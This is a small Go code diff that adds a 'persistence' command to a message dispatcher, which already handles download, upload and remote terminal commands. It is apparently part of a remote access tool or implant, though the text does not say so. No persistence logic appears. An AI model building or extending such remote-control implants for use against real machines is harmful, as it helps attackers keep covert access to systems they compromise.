@@ -46,6 +46,8 @@ func (c ConnectionHandler) Handle() error {
 			c.UseCase.Download.File(message.Data)
 		case "upload":
 			c.UseCase.Upload.File(message.Data)
+		case "persistence":
+			c.UseCase.Persistence.Persist(message.Data)
 		default:
 			c.UseCase.Terminal.Run(string(message.Data))
 		}
